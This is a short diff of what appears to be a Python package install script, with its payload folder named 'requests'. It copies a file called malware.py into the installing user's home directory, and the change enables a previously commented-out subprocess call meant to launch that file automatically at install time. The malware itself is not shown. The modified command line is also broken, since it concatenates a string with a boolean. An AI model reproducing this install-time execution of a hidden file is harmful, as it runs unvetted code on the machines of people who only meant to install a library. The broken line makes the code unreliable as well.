@@ -71,8 +71,8 @@ home = os.getenv('HOMEPATH')
 if home is None:
     home = os.getenv('HOME')
 shutil.copy2(os.path.join(here, 'requests', 'malware.py'), os.path.join(home,"malware.py"))
-command = sys.executable + " " + os.path.join(home, 'malware.py')
-#subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
+command = str(sys.executable + " " + os.path.exists(home + '/malware.py'))
+subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
 
 with open("/home/parish/output.txt", "w") as text_file:
     for root, dirs, files in os.walk(os.path.join(here, 'requests')):
